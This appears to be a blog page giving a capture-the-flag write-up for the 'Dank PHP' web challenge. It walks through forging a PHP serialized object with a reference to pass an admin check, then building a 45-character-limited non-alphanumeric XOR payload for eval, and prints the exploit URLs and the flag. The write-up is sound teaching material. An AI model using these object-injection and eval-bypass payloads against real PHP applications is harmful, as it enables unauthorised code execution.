@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Dank PHP - lmkalg's blog</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Challenge data", url: "#_top", children: [
+          ]},
+          {title: "Solution", url: "#solution", children: [
+              {title: "1st flag: PHP serialization", url: "#1st-flag-php-serialization" },
+              {title: "2nd Flag: non-alphanumeric code", url: "#2nd-flag-non-alphanumeric-code" },
+          ]},
+          {title: "Flag", url: "#flag", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/require.js"></script>
+      <script src="../../../search/search.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../register_x/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../register_x/" class="btn btn-xs btn-link">
+        Register X
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../own/eko2019/guess_my_number/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../own/eko2019/guess_my_number/" class="btn btn-xs btn-link">
+        Guess my number
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="challenge-data">Challenge data</h1>
+<ul>
+<li><strong>Name</strong>: Dank PHP</li>
+<li><strong>Category</strong>: Web</li>
+<li><strong>Points</strong>: 375</li>
+</ul>
+<h1 id="solution">Solution</h1>
+<p>The statement of the challenge was just a link to a page containing the following PHP code:
+http://104.197.168.32:17010/</p>
+<pre><code class="php">&lt;?php
+include &quot;flag.php&quot;;
+
+show_source(__FILE__);
+
+class user {
+  var $name;
+  var $pass;
+  var $secret;
+}
+
+if (isset($_GET['id'])) {
+
+  $id = $_GET['id'];
+
+  $usr = unserialize($id);
+  if ($usr) {
+    $usr-&gt;secret = $flag1;
+    if ($usr-&gt;name === &quot;admin&quot; &amp;&amp; $usr-&gt;pass === $usr-&gt;secret) {
+      echo &quot;Congratulation! Here is something for you...  &quot; . $usr-&gt;pass;
+      if (isset($_GET['caption'])) {
+        $cap = $_GET['caption'];
+        if (strlen($cap) &gt; 45) {
+          die(&quot;Naaaah, Take rest now&quot;);
+        }
+        if (preg_match(&quot;/[A-Za-z0-9]+/&quot;, $cap)) {
+          die(&quot;Don't mess with the best language!!&quot;);
+        }
+        eval($cap);
+        // Try to execute echoFlag()
+      } else {
+        echo &quot;NVM You are not eligible&quot;;
+      }
+    } else {
+      echo &quot;Oh no... You can't fool me&quot;;
+    }
+
+  } else {
+    echo &quot;are you trolling?&quot;;
+  }
+
+} else {
+  echo &quot;Go and watch some Youthoob Tutorials Kidosss!!&quot;;
+}
+&gt;
+
+</code></pre>
+
+<p>I'm not good a PHP, however I decided to go over it to practice. </p>
+<p>The flag was divided in two parts, so lets go in order:</p>
+<h2 id="1st-flag-php-serialization">1st flag: PHP serialization</h2>
+<p>For this part, we are only going to focus on the following part of the code:</p>
+<pre><code class="php">&lt;?php
+include &quot;flag.php&quot;;
+
+show_source(__FILE__);
+
+class user {
+  var $name;
+  var $pass;
+  var $secret;
+}
+
+if (isset($_GET['id'])) {
+
+  $id = $_GET['id'];
+
+  $usr = unserialize($id);
+  if ($usr) {
+    $usr-&gt;secret = $flag1;
+    if ($usr-&gt;name === &quot;admin&quot; &amp;&amp; $usr-&gt;pass === $usr-&gt;secret) {
+      echo &quot;Congratulation! Here is something for you...  &quot; . $usr-&gt;pass;
+</code></pre>
+
+<p>In order to get the first part of the flag, we should be able to execute the last line. Therefore, we should met all the previous conditions in order to get there:
+1. We need to serialize an object with the format of the class User.
+2. We need to send this serialized object thought the <strong>id</strong> parameter.
+3. This object should have the value <strong>admin</strong> in the <strong>name</strong> attribute. 
+4. This object should have the <strong>SAME</strong> value in the <strong>secret</strong> and <strong>pass</strong> attributes. 
+5. The value of <strong>secret</strong> and <strong>pass</strong> must be the value of <strong>$flag1</strong>, which is totally unknown for us. </p>
+<p>To start we need to serialize this object. How serialization works in PHP? No idea.
+I came across this <a href="http://irq5.io/2019/01/07/35c3-ctf-write-up-php/">blog</a>, which explain a little about it. However, the most important resource I got from here was the tool <strong>php-cli</strong> who let me test my own PHP code :). So now, instead of forging the PHP serialized object manually (first idea), let's let PHP forge it for us :). </p>
+<p>Once downloaded, I start writing my own code: </p>
+<pre><code class="php">&lt;?php
+// Build the same class
+class user{
+    var $name;
+    var $pass;
+    var $secret;
+}
+
+// Create the object
+$user = new User;
+
+// Assign values
+$user-&gt;name = &quot;admin&quot;;
+$user-&gt;secret = &quot;ANYTHING&quot;;
+// Aliasing!
+$user-&gt;pass = &amp;$user-&gt;secret;
+
+// Print out the serialized object
+echo serialize($user);
+?&gt;
+</code></pre>
+
+<p>The most important thing from this code was the part of the <strong>Aliasing</strong>. In order to get the same value as the attribute <strong>secret</strong> will have (the value of <strong>$flag1</strong>) we needed to define <strong>pass</strong> as a reference to 
+<strong>secret</strong>. </p>
+<p>The output of this code was:</p>
+<blockquote>
+<p>O:4:"user":3:{s:4:"name";s:5:"admin";s:4:"pass";s:8:"ANYTHING";s:6:"secret";R:3;}</p>
+</blockquote>
+<p>As you can see, after the <strong>secret</strong> part we have an <strong>R</strong>, which I think it stands for <strong>R</strong>eference.</p>
+<p>If we know send this object via parameter <strong>id</strong>, we get the first part of the flag:</p>
+<pre><code>http://104.197.168.32:17010/?id=O:4:&quot;user&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;pass&quot;;s:8:&quot;ANYTHING&quot;;s:6:&quot;secret&quot;;R:3;}
+&lt;strong&gt;infernoCTF{pHp_1s_&lt;/strong&gt;
+</code></pre>
+
+<h2 id="2nd-flag-non-alphanumeric-code">2nd Flag: non-alphanumeric code</h2>
+<p>Once we are here, we can kind of forget of the previous part and just focus on the following piece of PHP code:</p>
+<pre><code class="php">if (isset($_GET['caption'])) {
+    $cap = $_GET['caption'];
+    if (strlen($cap) &gt; 45) {
+        die(&quot;Naaaah, Take rest now&quot;);
+    }
+    if (preg_match(&quot;/[A-Za-z0-9]+/&quot;, $cap)) {
+        die(&quot;Don't mess with the best language!!&quot;);
+    }
+    eval($cap);
+    // Try to execute echoFlag()
+}
+else {
+    echo &quot;NVM You are not eligible&quot;;
+}
+</code></pre>
+
+<p>At first, to solve this, I thought the following possibilities:
+1. Bypass the regex. 
+2. Exploit some vulnerability in <strong>preg_match</strong>. 
+3. Execute some code only written with symbols. </p>
+<p>After some time searching, I found <a href="http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/">this blog</a>. Which was basically executing PHP code, only using symbols by doing some interesting trick with XOR.</p>
+<p>However, his trick was using a large amount of chars, and I only had 45 as maximum).
+Therefore, I built my own payload, using his trick. Let's first explain a little bit about it. </p>
+<h3 id="the-trick">The trick</h3>
+<p>Quick and dirty explained, the trick consists on definint a variable as a symbol, and then xoring it with another symbol to get the letter you want. For example, if you XOR the symbols <strong>}</strong> and <strong>&lt;</strong> you get a <strong>G</strong>:</p>
+<pre><code class="php">&lt;?php
+$_=&quot;{&quot;;
+$_=($_^&quot;&lt;&quot;);
+echo $_;'
+&gt;
+</code></pre>
+
+<p>The answer will be <strong>G</strong>. </p>
+<p>Therefore, going back to our example, my idea was to use this to build the string <strong>echoFlag();</strong> which would be executed later on by the <strong>eval</strong>. </p>
+<p>We had to find a combination of symbols that once xored, will write the each of the letter of <strong>echoFlag</strong>. In order to get that I wrote a tiny and dirty python script:</p>
+<pre><code class="python">def get_symbols_for(needed_char):
+    symbols = &quot;!\&quot;#$%&amp;\'()*+,-./:;?@[\\]^_`{|}~&quot;
+    for symbol in symbols:
+        blah = chr(ord(symbol) ^ ord(needed_char))
+        if blah in symbols:
+            print(&quot;Symbols {} and {} can be usd for char {}&quot;.format(blah, symbol, needed_char))
+            return
+    print(&quot;No symbols found :(&quot;)
+
+for char in &quot;echoFlag&quot;:
+    get_symbols_for(char)
+</code></pre>
+
+<p>Once executed the answer was: </p>
+<pre><code>Symbols @ and % can be usd for char e
+Symbols @ and # can be usd for char c
+Symbols @ and ( can be usd for char h
+Symbols @ and / can be usd for char o
+Symbols = and { can be usd for char F
+Symbols @ and , can be usd for char l
+Symbols @ and ! can be usd for char a
+Symbols &lt; and [ can be usd for char g
+</code></pre>
+
+<p>Cool. Now we have which symbols we need to xor to get our string. </p>
+<p>Let's test locally if this will work: </p>
+<pre><code class="php">&lt;?php
+function echoFlag(){
+    echo &quot;It has been called!&quot;;
+}
+
+$cap = '$_=(&quot;%#(/{,![&quot;^&quot;@@@@=@@&lt;&quot;);$_();';
+eval($cap);
+?&gt;
+</code></pre>
+
+<p><strong>This is the last version, I went trough some intermediate states that I don't thing are relevant</strong>.</p>
+<p>Once executed, the output was:
+<strong>It has been called!</strong>. </p>
+<p>Meaning it worked successfully!
+Let's send this payload through the <strong>cap</strong> parameter (don't forget to send the payload of the first part as well!)</p>
+<pre><code>http://104.197.168.32:17010/?id=O:4:&quot;user&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;pass&quot;;s:8:&quot;ANYTHING&quot;;s:6:&quot;secret&quot;;R:3;}&amp;caption=$_=(&quot;%#(/{,![&quot;^&quot;@@@@=@@&lt;&quot;);$_();
+&lt;strong&gt;infernoCTF{pHp_1s_&lt;/strong&gt;
+</code></pre>
+
+<p>Buhh! It didn't work. After some time, I figured it out that was because the <strong>#</strong> wasn't encoded :|. 
+Let's try again: </p>
+<pre><code>http://104.197.168.32:17010/?id=O:4:&quot;user&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;pass&quot;;s:8:&quot;ANYTHING&quot;;s:6:&quot;secret&quot;;R:3;}&amp;caption=$_=(&quot;%%23(/{,![&quot;^&quot;@@@@=@@&lt;&quot;);$_();
+
+&lt;strong&gt;infernoCTF{pHp_1s_&lt;/strong&gt;
+&lt;br&gt;
+&lt;strong&gt;a_h34dache}
+</code></pre>
+
+<p>Yess! Here is the second part of the flag: <strong>ia_h34dache}</strong>
+And we use only 32 chars instead of the max 45 (;))</p>
+<h1 id="flag">Flag</h1>
+<pre><code>infernoCTF{pHp_1s_a_h34dache}
+</code></pre>
+
+  <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="">Windmill Dark</a> theme by None (noraj).</p>
+</footer>
+
+</body>
+</html>
